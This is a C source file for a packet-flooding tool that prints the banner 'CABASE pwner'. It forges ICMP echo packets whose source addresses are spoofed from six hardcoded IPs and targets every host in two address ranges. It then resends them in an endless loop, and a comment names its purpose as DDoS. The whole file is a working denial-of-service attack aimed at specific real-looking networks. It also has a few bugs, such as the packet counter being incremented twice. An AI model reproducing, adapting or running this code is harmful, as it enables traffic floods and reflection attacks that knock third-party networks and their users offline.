#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

int icmpsend(u_int saddr, u_int daddr, unsigned short icmpid,
                 unsigned short icmpseq, char *data,
                 unsigned short datalen);
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int sockfd;
struct pseudohdr{
        unsigned long saddr;
        unsigned long daddr;
        char useless;
        unsigned char protocol;
        unsigned short length;
};
struct paquetes{
        char* packet;
        unsigned short packet_size;
        unsigned long daddr;
        sockaddr_in sock;
        unsigned short sockaddr_in_size;
};
unsigned int ALAN=0;
paquetes CASALAN[9999999];
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}


void generate_random_payload(char *buf, int size) {
    // Usamos caracteres legibles (letras y números) para que se vea limpio en Wireshark
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < size; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}
int main(int argc, char **argv){
init_rand(time(NULL));
        int on = 1;
        sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
        setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on));
        unsigned long rs[6];
        unsigned short srcp;
        unsigned short dstp;
rs[0]=inet_addr("200.0.17.1");
rs[1]=inet_addr("200.0.17.2");
rs[2]=inet_addr("45.68.8.254");
rs[3]=inet_addr("45.68.11.254");
rs[4]=inet_addr("45.68.8.12");
rs[5]=inet_addr("45.68.11.252");
printf("# CABASE pwner by Alan Sardon\n");
//Computize Packets
unsigned long A;
char ip_buffer[16];
char payload[56];
int i;int j;
for(i=1;i<255;i++){
for(j=0;j<6;j++){
srcp=rand_cmwc() % 65534+1;
dstp=rand_cmwc() % 65534+1;
snprintf(ip_buffer, sizeof(ip_buffer), "200.0.17.%d", i);
generate_random_payload(payload,55);
icmpsend(rs[j],inet_addr(ip_buffer),srcp,dstp,payload,sizeof(payload));
ALAN++;

srcp=rand_cmwc() % 65534+1;
dstp=rand_cmwc() % 65534+1;
snprintf(ip_buffer, sizeof(ip_buffer), "45.68.8.%d", i);
generate_random_payload(payload,55);
icmpsend(rs[j],inet_addr(ip_buffer),srcp,dstp,payload,sizeof(payload));
ALAN++;

}}
//Ya estan los paquetesd calculaDDoS
printf("A MITIG.AR\n");
while(true){
for(A=0;A<ALAN;A++){
sendto(sockfd, CASALAN[A].packet, CASALAN[A].packet_size, 0, (const sockaddr*) &CASALAN[A].sock,CASALAN[A].sockaddr_in_size);
}
printf("6");
sleep(1);
}
return 0;
}

int icmpsend (unsigned int saddr, unsigned int daddr, unsigned short icmpid,unsigned short icmpseq, char *data, unsigned short datalen){
        char *packet;
        struct iphdr *ip;
        struct tcphdr *tcp;
        struct icmphdr *icmp;
        struct pseudohdr *pseudo;
        struct sockaddr_in servaddr;
        int retval;
        int on = 1;
        int packet_size = (sizeof (struct iphdr) +
                                   sizeof (struct icmphdr) +
                                   datalen) * sizeof (char);

        packet = (char *) malloc (packet_size);

        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons (0);
        servaddr.sin_addr.s_addr = daddr;
        memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
        memset (packet, 0, packet_size);

    if (data && datalen > 0) {
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), data, datalen);
    }


    icmp->type = ICMP_ECHO;             // Tipo 8: Echo Request
    icmp->code = 0;                     // Código 0
    icmp->un.echo.id = htons(icmpid);   // Identificador del ping
    icmp->un.echo.sequence = htons(icmpseq); // Número de secuencia
    icmp->checksum = 0;                 // Debe ser 0 antes de calcularlo


    // El checksum de ICMP incluye la cabecera ICMP + los datos
    icmp->checksum = in_cksum((unsigned short *) icmp, sizeof(struct icmphdr) + datalen);

        ip->version = 4;
        ip->ihl = 5;
        ip->tot_len = htons (packet_size);
        ip->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        ip->ttl = 255;
        ip->tos = 16;
        ip->frag_off = 0;
        ip->protocol = IPPROTO_ICMP;
        ip->saddr = saddr;
        ip->daddr = daddr;
        ip->check = in_cksum ((unsigned short *) ip, sizeof (struct iphdr));
CASALAN[ALAN].packet=packet;
CASALAN[ALAN].packet_size=packet_size;
CASALAN[ALAN].sock=servaddr;
CASALAN[ALAN].sockaddr_in_size=sizeof(servaddr);
//      sendto (sockfd, packet, packet_size, 0, (const sockaddr*) &servaddr, sizeof (servaddr));
ALAN++;
        return 0;
}

unsigned short in_cksum (unsigned short *ptr, int nbytes){
        register long sum;
        u_short oddbyte;
        register u_short answer;
        sum = 0;
        while (nbytes > 1) {
                sum += *ptr++;
                nbytes -= 2;
        }
        if (nbytes == 1) {
                oddbyte = 0;
                *((u_char *) & oddbyte) = *(u_char *) ptr;
                sum += oddbyte;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;

        return (answer);
}
